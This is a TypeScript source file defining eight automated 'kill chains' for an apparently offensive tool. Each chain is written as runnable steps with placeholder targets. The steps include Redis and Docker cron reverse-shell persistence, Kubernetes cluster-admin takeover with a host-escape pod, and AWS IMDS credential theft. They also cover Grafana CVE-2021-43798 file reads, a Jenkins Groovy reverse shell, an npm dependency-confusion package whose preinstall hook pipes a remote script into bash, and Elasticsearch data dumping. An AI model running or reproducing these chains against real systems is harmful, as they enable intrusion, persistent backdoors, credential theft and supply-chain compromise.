export interface ChainStep {
  id:          string;
  name:        string;
  type:        "http_probe" | "inject" | "port_exploit" | "payload_fire" | "custom" | "info";
  url?:        string;
  target?:     string;
  port?:       number;
  method?:     string;
  param?:      string;
  payload?:    string;
  successIf?:  string;
  failAction?: "abort" | "continue" | "escalate";
  timeout?:    number;
  cmd?:        string;
}

export interface KillChain {
  id:          string;
  name:        string;
  description: string;
  category:    "infrastructure" | "cloud" | "container" | "supply-chain" | "ci-cd" | "lateral";
  severity:    "critical" | "high" | "medium";
  steps:       ChainStep[];
}

export const KILL_CHAINS: KillChain[] = [
  {
    id: "redis_rce_persist",
    name: "Redis → RCE + Host Persistence",
    description: "Unauthenticated Redis → CONFIG SET to write SSH key or cron job → persistent backdoor",
    category: "infrastructure",
    severity: "critical",
    steps: [
      {
        id:"s1", name:"Probe Redis port 6379", type:"port_exploit",
        target:"TARGET", port:6379, failAction:"abort",
      },
      {
        id:"s2", name:"Verify no-auth (INFO server)", type:"custom",
        cmd:`echo -e "*1\r\n\$4\r\nINFO\r\n" | nc -w3 TARGET 6379 | head -5`,
        failAction:"continue",
      },
      {
        id:"s3", name:"CONFIG SET dir /var/spool/cron/crontabs", type:"custom",
        cmd:`echo -e "*4\r\n\$6\r\nCONFIG\r\n\$3\r\nSET\r\n\$3\r\ndir\r\n\$26\r\n/var/spool/cron/crontabs\r\n" | nc -w3 TARGET 6379`,
        failAction:"escalate",
      },
      {
        id:"s4", name:"CONFIG SET dbfilename root", type:"custom",
        cmd:`echo -e "*4\r\n\$6\r\nCONFIG\r\n\$3\r\nSET\r\n\$10\r\ndbfilename\r\n\$4\r\nroot\r\n" | nc -w3 TARGET 6379`,
        failAction:"continue",
      },
      {
        id:"s5", name:"SET cron payload (rev shell every minute)", type:"custom",
        cmd:`echo -e "*3\r\n\$3\r\nSET\r\n\$3\r\nnx1\r\n\$57\r\n\n* * * * * bash -i >& /dev/tcp/LHOST/LPORT 0>&1\n\n\r\n" | nc -w3 TARGET 6379`,
        failAction:"continue",
      },
      {
        id:"s6", name:"BGSAVE — flush to disk", type:"custom",
        cmd:`echo -e "*1\r\n\$6\r\nBGSAVE\r\n" | nc -w3 TARGET 6379`,
        failAction:"continue",
      },
      {
        id:"s7", name:"Verify — OOB DNS callback after 65s", type:"info",
        cmd:`echo "Cron fires in <60s. Start listener: nc -lvnp LPORT"`,
        failAction:"continue",
      },
    ],
  },
  {
    id: "docker_socket_escape",
    name: "Docker Socket → Host Persistence",
    description: "Exposed Docker API → spawn privileged container → write host cron → persistent root shell",
    category: "container",
    severity: "critical",
    steps: [
      {
        id:"s1", name:"Verify Docker API (2375/2376)", type:"port_exploit",
        target:"TARGET", port:2375, failAction:"abort",
      },
      {
        id:"s2", name:"List running containers", type:"http_probe",
        url:"http://TARGET:2375/containers/json?all=true", method:"GET",
        successIf:"200", failAction:"abort",
      },
      {
        id:"s3", name:"Create privileged alpine container (host mount)", type:"http_probe",
        url:"http://TARGET:2375/containers/create?name=nx_esc",
        method:"POST",
        payload:JSON.stringify({Image:"alpine",Cmd:["/bin/sh","-c","echo '* * * * * root bash -i >& /dev/tcp/LHOST/LPORT 0>&1' >> /host/etc/cron.d/nx"],HostConfig:{Binds:["/:/host"],Privileged:true}}),
        successIf:"201", failAction:"escalate",
      },
      {
        id:"s4", name:"Start container", type:"http_probe",
        url:"http://TARGET:2375/containers/nx_esc/start", method:"POST",
        payload:"", successIf:"204", failAction:"continue",
      },
      {
        id:"s5", name:"Wait 3s + cleanup container", type:"custom",
        cmd:`sleep 3; curl -sk -X DELETE "http://TARGET:2375/containers/nx_esc?force=true" 2>/dev/null`,
        failAction:"continue",
      },
      {
        id:"s6", name:"Verify cron written", type:"http_probe",
        url:"http://TARGET:2375/containers/create?name=nx_verify",
        method:"POST",
        payload:JSON.stringify({Image:"alpine",Cmd:["/bin/sh","-c","cat /host/etc/cron.d/nx"],HostConfig:{Binds:["/:/host"]}}),
        successIf:"201", failAction:"continue",
      },
    ],
  },
  {
    id: "k8s_sa_takeover",
    name: "K8s SA Token → Cluster Admin",
    description: "Pod SA token → RBAC recon → ClusterRoleBinding creation → cluster-admin takeover",
    category: "container",
    severity: "critical",
    steps: [
      {
        id:"s1", name:"Read pod SA token", type:"info",
        cmd:`cat /var/run/secrets/kubernetes.io/serviceaccount/token`,
        failAction:"abort",
      },
      {
        id:"s2", name:"Probe K8s API (6443)", type:"port_exploit",
        target:"TARGET", port:6443, failAction:"abort",
      },
      {
        id:"s3", name:"GET /api/v1/namespaces (RBAC check)", type:"http_probe",
        url:"https://TARGET:6443/api/v1/namespaces",
        method:"GET", successIf:"200", failAction:"escalate",
      },
      {
        id:"s4", name:"GET /api/v1/secrets (dump secrets)", type:"http_probe",
        url:"https://TARGET:6443/api/v1/secrets",
        method:"GET", successIf:"200", failAction:"continue",
      },
      {
        id:"s5", name:"Create ClusterRoleBinding (cluster-admin)", type:"http_probe",
        url:"https://TARGET:6443/apis/rbac.authorization.k8s.io/v1/clusterrolebindings",
        method:"POST",
        payload:JSON.stringify({apiVersion:"rbac.authorization.k8s.io/v1",kind:"ClusterRoleBinding",metadata:{name:"nx-admin"},roleRef:{apiGroup:"rbac.authorization.k8s.io",kind:"ClusterRole",name:"cluster-admin"},subjects:[{kind:"ServiceAccount",name:"default",namespace:"default"}]}),
        successIf:"201", failAction:"continue",
      },
      {
        id:"s6", name:"Create privileged escape pod", type:"http_probe",
        url:"https://TARGET:6443/api/v1/namespaces/default/pods",
        method:"POST",
        payload:JSON.stringify({apiVersion:"v1",kind:"Pod",metadata:{name:"nx-esc"},spec:{hostPID:true,hostNetwork:true,hostIPC:true,containers:[{name:"nx",image:"alpine",command:["/bin/sh","-c","nsenter --target 1 --mount --uts --ipc --net --pid -- bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'"],securityContext:{privileged:true}}],restartPolicy:"Never"}}),
        successIf:"201", failAction:"continue",
      },
    ],
  },
  {
    id: "aws_imds_breach",
    name: "AWS IMDS → IAM Creds → S3 Exfil",
    description: "IMDS metadata endpoint → IAM role credentials → S3 bucket enumeration → data exfil",
    category: "cloud",
    severity: "critical",
    steps: [
      {
        id:"s1", name:"Check IMDSv1 availability", type:"http_probe",
        url:"http://169.254.169.254/latest/meta-data/", method:"GET",
        successIf:"200", failAction:"escalate",
      },
      {
        id:"s2", name:"Get IAM role name", type:"http_probe",
        url:"http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        method:"GET", successIf:"200", failAction:"abort",
      },
      {
        id:"s3", name:"Fetch IAM credentials (AccessKey+SecretKey+Token)", type:"custom",
        cmd:`_R=$(curl -sk http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null); curl -sk "http://169.254.169.254/latest/meta-data/iam/security-credentials/$_R" 2>/dev/null`,
        failAction:"abort",
      },
      {
        id:"s4", name:"Get account identity", type:"custom",
        cmd:`curl -sk http://169.254.169.254/latest/dynamic/instance-identity/document 2>/dev/null`,
        failAction:"continue",
      },
      {
        id:"s5", name:"List S3 buckets via credentials", type:"custom",
        cmd:`python3 -c "import boto3; s3=boto3.client('s3'); buckets=s3.list_buckets()['Buckets']; [print(b['Name']) for b in buckets]" 2>/dev/null`,
        failAction:"continue",
      },
      {
        id:"s6", name:"Get user data (may contain secrets)", type:"http_probe",
        url:"http://169.254.169.254/latest/user-data",
        method:"GET", successIf:"200", failAction:"continue",
      },
    ],
  },
  {
    id: "grafana_full_breach",
    name: "Grafana Default Creds + CVE-2021-43798 + DB Pivot",
    description: "Grafana default admin:admin → datasource creds → database pivot → data exfil",
    category: "infrastructure",
    severity: "critical",
    steps: [
      {
        id:"s1", name:"Probe Grafana (3000)", type:"port_exploit",
        target:"TARGET", port:3000, failAction:"abort",
      },
      {
        id:"s2", name:"Try default admin:admin credentials", type:"http_probe",
        url:"http://TARGET:3000/api/org",
        method:"GET", successIf:"200", failAction:"escalate",
      },
      {
        id:"s3", name:"CVE-2021-43798 — read /etc/passwd", type:"http_probe",
        url:"http://TARGET:3000/public/plugins/alertlist/../../../../../../../etc/passwd",
        method:"GET", successIf:"200", failAction:"continue",
      },
      {
        id:"s4", name:"Dump datasources (contains DB creds)", type:"http_probe",
        url:"http://TARGET:3000/api/datasources",
        method:"GET", successIf:"200", failAction:"continue",
      },
      {
        id:"s5", name:"Read Grafana admin password hash", type:"http_probe",
        url:"http://TARGET:3000/public/plugins/alertlist/../../../../../../../var/lib/grafana/grafana.db",
        method:"GET", successIf:"200", failAction:"continue",
      },
    ],
  },
  {
    id: "jenkins_groovy_rce",
    name: "Jenkins Unauth → Groovy RCE → Network Pivot",
    description: "Jenkins unauthenticated API → Script Console Groovy execution → network recon → pivot",
    category: "ci-cd",
    severity: "critical",
    steps: [
      {
        id:"s1", name:"Probe Jenkins (8080)", type:"port_exploit",
        target:"TARGET", port:8080, failAction:"abort",
      },
      {
        id:"s2", name:"Enumerate Jenkins API (/api/json)", type:"http_probe",
        url:"http://TARGET:8080/api/json?depth=1",
        method:"GET", successIf:"200", failAction:"abort",
      },
      {
        id:"s3", name:"Check unauth Script Console (/script)", type:"http_probe",
        url:"http://TARGET:8080/script",
        method:"GET", successIf:"200", failAction:"continue",
      },
      {
        id:"s4", name:"CVE-2024-23897 — CLI file read /etc/passwd", type:"custom",
        cmd:`curl -sk "http://TARGET:8080/cli?remoting=false" -H "Content-Type: application/x-www-form-urlencoded" --data 'command=help+@/etc/passwd' 2>/dev/null`,
        failAction:"continue",
      },
      {
        id:"s5", name:"Groovy RCE (id + uname + hostname)", type:"custom",
        cmd:`curl -sk -X POST "http://TARGET:8080/scriptText" --data-urlencode 'script=def cmd=["id","hostname","whoami"].collect{["bash","-c",it].execute().text};println cmd.join("\n")' 2>/dev/null`,
        failAction:"continue",
      },
      {
        id:"s6", name:"Groovy reverse shell", type:"custom",
        cmd:`curl -sk -X POST "http://TARGET:8080/script" --data-urlencode 'script=["bash","-c","bash -i >& /dev/tcp/LHOST/LPORT 0>&1"].execute()' 2>/dev/null`,
        failAction:"continue",
      },
    ],
  },
  {
    id: "supply_chain_npm",
    name: "npm Dependency Confusion → CI/CD RCE",
    description: "Discover internal package names → publish to public npm → preinstall hook fires on CI",
    category: "supply-chain",
    severity: "high",
    steps: [
      {
        id:"s1", name:"Discover internal packages from public GitHub", type:"info",
        cmd:`curl -sk "https://api.github.com/search/code?q=org%3ATARGET_ORG+filename%3Apackage.json+registry.npmjs.org" 2>/dev/null | python3 -c "import sys,json;[print(x['repository']['full_name']) for x in json.load(sys.stdin)['items']]" 2>/dev/null`,
        failAction:"continue",
      },
      {
        id:"s2", name:"Check if package exists on public npm", type:"http_probe",
        url:"https://registry.npmjs.org/INTERNAL_PACKAGE_NAME",
        method:"GET", successIf:"404", failAction:"abort",
      },
      {
        id:"s3", name:"Create malicious package with preinstall hook", type:"info",
        cmd:`mkdir -p /tmp/nx_pkg && echo '{"name":"INTERNAL_PACKAGE","version":"9999.0.0","scripts":{"preinstall":"curl -fsSk http://LHOST:LPORT/npm.sh|bash"}}' > /tmp/nx_pkg/package.json && echo 'module.exports={}' > /tmp/nx_pkg/index.js`,
        failAction:"continue",
      },
      {
        id:"s4", name:"Publish to public npm registry", type:"info",
        cmd:`npm publish /tmp/nx_pkg/ --registry https://registry.npmjs.org --access public`,
        failAction:"continue",
      },
      {
        id:"s5", name:"Verify on registry", type:"http_probe",
        url:"https://registry.npmjs.org/INTERNAL_PACKAGE/9999.0.0",
        method:"GET", successIf:"200", failAction:"continue",
      },
    ],
  },
  {
    id: "elastic_data_breach",
    name: "Elasticsearch → Data Exfil",
    description: "Unauthenticated Elasticsearch → index enumeration → bulk data exfil",
    category: "infrastructure",
    severity: "critical",
    steps: [
      {
        id:"s1", name:"Probe Elasticsearch (9200)", type:"port_exploit",
        target:"TARGET", port:9200, failAction:"abort",
      },
      {
        id:"s2", name:"Get cluster info + health", type:"http_probe",
        url:"http://TARGET:9200/", method:"GET", successIf:"200", failAction:"abort",
      },
      {
        id:"s3", name:"List all indices", type:"http_probe",
        url:"http://TARGET:9200/_cat/indices?v&s=docs.count:desc",
        method:"GET", successIf:"200", failAction:"abort",
      },
      {
        id:"s4", name:"Dump first 1000 docs from largest index", type:"custom",
        cmd:`curl -sk "http://TARGET:9200/_search?size=1000&sort=_score:desc" -H "Content-Type: application/json" -d '{"query":{"match_all":{}}}' 2>/dev/null | python3 -c "import sys,json; docs=json.load(sys.stdin)['hits']['hits']; [print(json.dumps(d['_source'])) for d in docs[:20]]" 2>/dev/null`,
        failAction:"continue",
      },
      {
        id:"s5", name:"Search for password/key fields", type:"http_probe",
        url:`http://TARGET:9200/_search`,
        method:"POST",
        payload:JSON.stringify({query:{multi_match:{query:"password secret token api_key",fields:["*"]}},size:50}),
        successIf:"200", failAction:"continue",
      },
    ],
  },
];

export function getKillChain(id: string): KillChain | undefined {
  return KILL_CHAINS.find(c => c.id === id);
}
